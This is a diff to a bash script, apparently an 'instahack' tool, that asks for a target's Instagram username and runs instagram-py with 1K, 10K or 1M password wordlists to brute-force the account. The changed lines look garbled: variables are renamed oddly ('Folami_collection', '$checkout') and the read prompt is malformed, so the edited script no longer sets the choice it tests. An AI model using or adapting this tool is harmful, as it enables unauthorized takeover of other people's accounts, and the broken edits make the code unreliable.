@@ -44,8 +44,8 @@ read -p "[#] Enter the username of the target : " Folami_collection
 echo -e "\nChoose any of the options below :
 ${"\033[92m"}[${"\033[91m"}1${"\033[92m"}] ${"\033[93m"}1K passwords wordlist file${"\033[00m"}
 ${GREEN}[${RED}2${GREEN}] ${YELLOW}10K passwords wordlist file${DEFCOL}
-${GREEN}[${RED}3${GREEN}] ${YELLOW}1M passwords wordlist file${DEFCOL}\n"
-read -p "[#] Enter your choice: "1"
+${"\033[92m"}[${"\033[91m"}3${"\033[92m"}] ${"\033[93m"}1M passwords wordlist file${"\033[00m"}\n"
+read -p "[#] Enter your choice: "choice3"
 
 # Checking the user entered option
 if [[ $choice == "1" ]]; then
@@ -59,7 +59,7 @@ elif [[ $choice == "2" ]]; then
 elif [[ $choice == "3" ]]; then
 	# If the user entered the option for the 1M password wordlist file
 
-	instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass3.txt
+	instagram-py --username $Folami_collection --password-list $checkout/instahack/pass/pass3.txt
 else
 	# If the user entered option is not recognized (not one of the 3 wordlist files), then we display the error on the console screen
 
